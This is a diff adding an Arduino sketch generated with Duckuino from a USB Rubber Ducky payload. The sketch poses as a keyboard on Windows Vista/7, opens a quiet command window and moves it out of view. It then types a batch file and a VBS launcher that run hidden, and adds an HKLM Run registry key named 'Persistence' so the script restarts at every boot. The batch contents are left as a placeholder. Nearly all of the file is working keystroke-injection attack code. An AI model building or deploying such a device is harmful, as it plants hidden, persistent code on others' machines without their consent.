@@ -1,0 +1,122 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // By overwraith
+  // GenericBatch.txt
+  // Encoder V2.4
+  // Target: WINDOWS VISTA/7
+  // ADMIN PRIVILEGES
+  // PURPOSE: to create a script that types in a generic batch file and executes siletntly.
+  // Using the run command for a broader OS base.
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+  Keyboard.print(F("cmd /Q /D /T:7F /F:OFF /V:ON /K"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(750);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  Keyboard.print(F("M"));
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  // Make batch file.
+  // Delete batch file if already exists.
+  Keyboard.print(F("erase /Q batch.bat"));
+
+  typeKey(KEY_RETURN);
+
+  // Make the batch file.
+  Keyboard.print(F("copy con batch.bat"));
+
+  typeKey(KEY_RETURN);
+
+  // Registry key that restarts script on reboot.
+  Keyboard.print(F("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d \"wscript.exe %TEMP%\\invis.vbs %TEMP%\\batch.bat\" /f"));
+
+  typeKey(KEY_RETURN);
+
+  // Copy invis.bat to another location
+  Keyboard.print(F("move invis.vbs %TEMP%"));
+
+  typeKey(KEY_RETURN);
+
+  // Copy current program to another location.
+  Keyboard.print(F("move %0 %TEMP%"));
+
+  typeKey(KEY_RETURN);
+
+  // Continue batch file contents here. . .
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  // Make the VBS file that allows running invisibly.
+  // Delete vbs file if already exists
+  Keyboard.print(F("erase /Q invis.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  // FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
+  Keyboard.print(F("copy con invis.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("wscript.exe invis.vbs batch.bat"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("exit"));
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
